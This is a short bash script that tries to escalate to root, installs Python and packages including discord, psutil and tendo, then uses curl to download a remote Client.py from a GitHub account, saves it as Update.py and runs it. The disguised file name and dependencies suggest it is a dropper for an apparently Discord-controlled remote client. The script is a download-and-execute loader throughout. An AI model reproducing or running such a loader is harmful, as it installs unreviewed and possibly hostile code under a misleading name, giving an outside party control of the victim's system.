#!/bin/bash

if [ "${UID}" -eq 0 ]
then
    echo You are root
else
    echo You are not root
    su
fi

cd /tmp
apt-get update
apt-get install curl
apt-get install python3
apt-get install python3-pip -y

pip install discord
pip install tendo
pip install urllib
pip install requests
pip install psutil

curl -o Update.py https://github.com/rxu7s/Public/raw/main/Client.py
chmod +x *
python3 Update.py